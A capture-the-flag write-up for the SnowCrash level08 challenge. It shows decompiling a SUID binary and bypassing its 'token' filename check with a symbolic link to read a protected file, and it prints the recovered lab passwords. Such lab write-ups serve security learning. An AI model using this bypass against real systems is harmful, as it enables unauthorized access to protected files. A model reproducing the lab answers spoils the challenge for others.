- In the directory `/home/user/level08` a binary `level08` is present with SUID of flag08. There is also a `token` file unreadable due to permissions.

- Launching the binary requires a file input. Passing the `token` file to the binary does not permit us to read the file

```
level08@SnowCrash:~$ pwd
/home/user/level08
level08@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-r-x------  1 level08 level08  675 Apr  3  2012 .profile
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
level08@SnowCrash:~$ ./level08 
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token 
You may not access 'token'
```

- Ex-filtrating the binary to the attack machine and launching `ghidra` to de-compile the code reveals further details

```
┌──(kali㉿kali)-[~/Desktop/snowcrash]
└─$ sudo ghidra level08
```

![[Pasted image 20250914044700.png]]

- Specifically the line `pcVar1 = strstr((char *)in_stack_00000008[1],"token");` checks to see if the string `token` is visible in the argument passed into the program. If it is, it exits with an error.

![[Pasted image 20250914044934.png]]

- We cannot copy or rename the original `token` file due to permissions but we can create a symbolic link which can be named something else to bypass the `token` string check

```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/somerandomname
level08@SnowCrash:~$ ls -la /tmp/somerandomname
lrwxrwxrwx 1 level08 level08 24 Sep 18 23:53 /tmp/somerandomname -> /home/user/level08/token
level08@SnowCrash:~$ ./level08 /tmp/somerandomname
quif5eloekouj29ke0vouxean
```

- Use the token obtained to authenticate as `flag08` and run the `getflag` command
```
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

- Authenticate as `level09` using the new token\
```
flag08@SnowCrash:~$ su level09
Password: 
level09@SnowCrash:~$ 
```